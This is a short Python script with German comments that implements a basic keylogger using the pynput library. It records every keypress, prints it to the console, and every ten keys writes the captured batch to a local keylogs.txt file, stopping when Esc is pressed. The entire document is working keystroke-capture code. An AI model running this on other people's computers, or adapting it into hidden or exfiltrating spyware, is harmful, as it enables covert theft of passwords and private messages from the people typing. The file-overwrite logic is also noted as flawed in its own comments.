from asyncore import write
import pynput
from pynput.keyboard import Key, Listener

zähler = 0 #  variabel
keys = [] #  liste erstellen

def on_press(key):
    global keys, zähler

    keys.append(key)
    zähler += 1
    print("{0} pressed".format(key))

    if zähler >= 10: # für jede gedrückte taste wird +1 gezählt
        zähler = 0 #  resetet den zähler
        write_file(keys)
        keys = [] #  reset für die liste

def write_file(keys):
    with open("keylogs.txt", "w") as f:  #  schreibt die erkannten tasten in die log datei mit "w" wird diese erstellt (muss ggf. in "a" umgewandelt werden)
        for key in keys:
            f.write(str(key)) # speichert die tasten im str format



def on_release(key):
    if key == Key.esc: #  Bricht aus der schleife wenn esc gedrückt wird
        return False


with Listener(on_press= on_press, on_release=on_release) as listener: # wenn eine Taste Gedrückt wird unbd wenn eine Tste losgelassen wird
    listener.join()